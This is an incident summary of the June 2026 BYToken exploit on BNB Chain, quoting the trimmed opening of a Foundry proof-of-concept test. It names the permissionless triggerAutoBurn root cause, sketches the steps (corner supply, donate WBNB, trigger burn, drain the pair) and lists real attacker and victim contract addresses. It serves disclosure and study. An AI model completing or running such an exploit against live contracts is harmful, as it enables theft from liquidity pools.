# [?] BYToken - Permissionless triggerAutoBurn Reserve Manipulation

## Summary
Severity: Unknown
Chain: BNB Chain
Component: BYToken
Published: 2026-06-04
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/BYToken_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$87,402 (146.60 WBNB)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~$87,402 (146.60 WBNB drained from the BY/WBNB PancakeSwap pair)
// Attacker EOA     : 0x047547A4fa4a67C1032d249B49EC1a79c0460BAD
// Attacker Contract: 0xc08106a36BfA9CFad264F0d64fC45B93543485Ec
// Vulnerable       : 0x6f50cffEcd4e00EcF7E442774C08c089450B62Ca (BY token)
// Victim pair      : 0x1F358e18e0DB68FF33C2319C8DaD328eDF9B7059 (BY/WBNB)
// Attack Tx        : 0xe31c681eee764fb94b1b6bda3bbb0e4f25acb129c19040b9f58ad30541980979
// Attack date      : June 4, 2026  Chain: BSC  Block: 102329719
// SlowMist         : https://hacked.slowmist.io/ (BY, BSC, ~$87.4K)
//
// Root cause: triggerAutoBurn() is permissionless.
// Attacker corners BY supply via router, donates WBNB to hit trading threshold,
// triggers burn to crash BY reserve, then sells tiny BY to drain WBNB.

interface IBYToken is IERC20 {
    function triggerAutoBurn() external;
    function lastBurnTimestamp() external view returns (uint256);
    function BURN_INTERVAL() external view returns (uint256);
    function getBNBPrice() external view returns (uint256);
    function TRADING_ENABLE_BNB_THRESHOLD() external view returns (uint256);
    function tradingEnabled() external view returns (bool);
}

contract BYTokenExploitTest is Test {
    IBYToken constant BY     = IBYToken(0x6f50cffEcd4e00EcF7E442774C08c089450B62Ca);
    IERC20   constant WBNBT  = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakePair constant PAIR = IPancakePair(0x1F358e18e0DB68FF33C2319C8DaD328eDF9B7059);
    IPancakeRouter constant ROUTER = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    uint256 constant ATTACK_BLOCK = 102_329_719;
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/BYToken_exp.sol_
